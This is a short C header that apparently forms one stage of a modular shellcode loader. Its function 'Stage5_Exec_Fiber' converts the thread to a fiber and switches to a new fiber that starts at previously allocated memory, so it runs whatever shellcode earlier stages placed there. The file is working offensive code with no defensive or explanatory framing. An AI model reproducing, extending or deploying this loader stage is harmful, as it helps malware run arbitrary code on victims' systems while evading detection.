#pragma once
#include <windows.h>
#include "../../core/utils.h"
#include "../context.h"

inline BOOL Stage5_Exec_Fiber(TechniqueContext* ctx)
{
    if (!ctx || !ctx->allocated_mem)
        return FALSE;

    LPVOID mainFiber = ConvertThreadToFiber(NULL);
    if (!mainFiber) {
#ifdef DEBUG_MODE
        DEBUG_MSG("Stage 5", "ConvertThreadToFiber failed (err=%lu)", GetLastError());
#endif
        return FALSE;
    }

    LPVOID shellFiber = CreateFiber(
        0,
        (LPFIBER_START_ROUTINE)ctx->allocated_mem,
        NULL
    );

    if (!shellFiber) {
#ifdef DEBUG_MODE
        DEBUG_MSG("Stage 5", "CreateFiber failed (err=%lu)", GetLastError());
#endif
        return FALSE;
    }

#ifdef DEBUG_MODE
    DEBUG_MSG("Stage 5", "Switching to fiber at %p", ctx->allocated_mem);
#endif

    SwitchToFiber(shellFiber);

    DeleteFiber(shellFiber);
    return TRUE;
}
